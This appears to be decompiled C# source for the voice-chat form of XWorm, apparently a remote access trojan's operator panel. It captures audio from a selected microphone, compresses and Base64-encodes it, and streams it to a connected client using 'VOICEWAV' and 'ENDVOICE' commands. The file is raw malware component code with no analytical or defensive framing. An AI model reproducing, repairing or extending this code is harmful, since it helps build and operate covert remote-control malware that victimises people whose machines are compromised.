using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;
using NAudio.Wave;
using XWorm.My.Resources;

namespace XWorm
{
	// Token: 0x02000034 RID: 52
	[DesignerGenerated]
	public partial class VoiceChat : Form
	{
		// Token: 0x0600098E RID: 2446 RVA: 0x0005340C File Offset: 0x0005160C
		public VoiceChat()
		{
			base.FormClosing += this.VoiceChat_FormClosing;
			this.sourcestream = null;
			this.InitializeComponent();
		}

		// Token: 0x17000381 RID: 897
		// (get) Token: 0x06000991 RID: 2449 RVA: 0x00053AF0 File Offset: 0x00051CF0
		// (set) Token: 0x06000992 RID: 2450 RVA: 0x00053AFC File Offset: 0x00051CFC
		internal virtual Guna2GradientButton Guna2GradientButton1
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2GradientButton1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2GradientButton1_Click);
				Guna2GradientButton guna2GradientButton = this._Guna2GradientButton1;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click -= value2;
				}
				this._Guna2GradientButton1 = value;
				guna2GradientButton = this._Guna2GradientButton1;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click += value2;
				}
			}
		}

		// Token: 0x17000382 RID: 898
		// (get) Token: 0x06000993 RID: 2451 RVA: 0x00053B3F File Offset: 0x00051D3F
		// (set) Token: 0x06000994 RID: 2452 RVA: 0x00053B4C File Offset: 0x00051D4C
		internal virtual Guna2ComboBox Guna2ComboBox1
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2ComboBox1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2ComboBox1_SelectedIndexChanged);
				Guna2ComboBox guna2ComboBox = this._Guna2ComboBox1;
				if (guna2ComboBox != null)
				{
					guna2ComboBox.SelectedIndexChanged -= value2;
				}
				this._Guna2ComboBox1 = value;
				guna2ComboBox = this._Guna2ComboBox1;
				if (guna2ComboBox != null)
				{
					guna2ComboBox.SelectedIndexChanged += value2;
				}
			}
		}

		// Token: 0x17000383 RID: 899
		// (get) Token: 0x06000995 RID: 2453 RVA: 0x00053B8F File Offset: 0x00051D8F
		// (set) Token: 0x06000996 RID: 2454 RVA: 0x00053B99 File Offset: 0x00051D99
		internal virtual Label Label1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000384 RID: 900
		// (get) Token: 0x06000997 RID: 2455 RVA: 0x00053BA2 File Offset: 0x00051DA2
		// (set) Token: 0x06000998 RID: 2456 RVA: 0x00053BAC File Offset: 0x00051DAC
		internal virtual StatusStrip StatusStrip1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000385 RID: 901
		// (get) Token: 0x06000999 RID: 2457 RVA: 0x00053BB5 File Offset: 0x00051DB5
		// (set) Token: 0x0600099A RID: 2458 RVA: 0x00053BBF File Offset: 0x00051DBF
		internal virtual ToolStripStatusLabel ToolStripStatusLabel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000386 RID: 902
		// (get) Token: 0x0600099B RID: 2459 RVA: 0x00053BC8 File Offset: 0x00051DC8
		// (set) Token: 0x0600099C RID: 2460 RVA: 0x00053BD4 File Offset: 0x00051DD4
		internal virtual System.Windows.Forms.Timer Timer1
		{
			[CompilerGenerated]
			get
			{
				return this._Timer1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				System.Windows.Forms.Timer timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer1 = value;
				timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x17000387 RID: 903
		// (get) Token: 0x0600099D RID: 2461 RVA: 0x00053C17 File Offset: 0x00051E17
		// (set) Token: 0x0600099E RID: 2462 RVA: 0x00053C21 File Offset: 0x00051E21
		internal virtual PictureBox PictureBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x0600099F RID: 2463 RVA: 0x00053C2C File Offset: 0x00051E2C
		public object VoiceStop()
		{
			try
			{
				this.MICR = false;
				bool flag = this.sourcestream != null;
				if (flag)
				{
					this.sourcestream.StopRecording();
					this.sourcestream.Dispose();
					this.sourcestream = null;
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
			object result;
			return result;
		}

		// Token: 0x060009A0 RID: 2464 RVA: 0x00053CA0 File Offset: 0x00051EA0
		public void audioDataAvailable(object sender, WaveInEventArgs e)
		{
			try
			{
				bool micr = this.MICR;
				if (micr)
				{
					byte[] array = Helper.SB(string.Concat(new string[]
					{
						"VOICEWAV",
						SettingsHelper.SPL,
						Convert.ToBase64String(Helper.Compress(e.Buffer)),
						SettingsHelper.SPL,
						Conversions.ToString(e.BytesRecorded),
						SettingsHelper.SPL
					}));
					Client $VB$NonLocal_2 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						$VB$NonLocal_2.BeginSend((byte[])a0);
					}, array);
					this.ToolStripStatusLabel1.Text = "Size :  [" + Helper.BytesToString((long)array.Length) + "]";
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x060009A1 RID: 2465 RVA: 0x00053D88 File Offset: 0x00051F88
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				bool flag = !this.C.IsConnected;
				if (flag)
				{
					base.Close();
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x060009A2 RID: 2466 RVA: 0x00053DE0 File Offset: 0x00051FE0
		private void VoiceChat_FormClosing(object sender, FormClosingEventArgs e)
		{
			byte[] state = Helper.SB("ENDVOICE");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
			this.VoiceStop();
		}

		// Token: 0x060009A3 RID: 2467 RVA: 0x00053E28 File Offset: 0x00052028
		private void Guna2GradientButton1_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = Operators.CompareString(this.Guna2GradientButton1.Text, "Start", false) == 0;
				if (flag)
				{
					this.sourcestream = new WaveInEvent();
					this.sourcestream.DeviceNumber = Convert.ToInt32(this.Guna2ComboBox1.SelectedIndex);
					this.sourcestream.NumberOfBuffers = 1;
					this.sourcestream.BufferMilliseconds = 500;
					this.sourcestream.NumberOfBuffers = 5;
					this.sourcestream.WaveFormat = new WaveFormat(8000, 16, 1);
					this.sourcestream.DataAvailable += this.audioDataAvailable;
					this.sourcestream.StartRecording();
					this.MICR = true;
					this.Guna2GradientButton1.Text = "Stop";
					this.Guna2GradientButton1.Image = Resources._Stop;
					this.PictureBox1.Enabled = true;
				}
				else
				{
					this.VoiceStop();
					this.Guna2GradientButton1.Text = "Start";
					this.Guna2GradientButton1.Image = Resources.Play;
					this.PictureBox1.Enabled = false;
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x060009A4 RID: 2468 RVA: 0x00053F94 File Offset: 0x00052194
		private void Guna2ComboBox1_SelectedIndexChanged(object sender, EventArgs e)
		{
			this.VoiceStop();
			this.Guna2GradientButton1.Text = "Start";
			this.Guna2GradientButton1.Image = Resources.Play;
			this.PictureBox1.Enabled = false;
		}

		// Token: 0x04000404 RID: 1028
		public Client C;

		// Token: 0x04000405 RID: 1029
		public bool MICR;

		// Token: 0x04000406 RID: 1030
		public WaveInEvent sourcestream;
	}
}
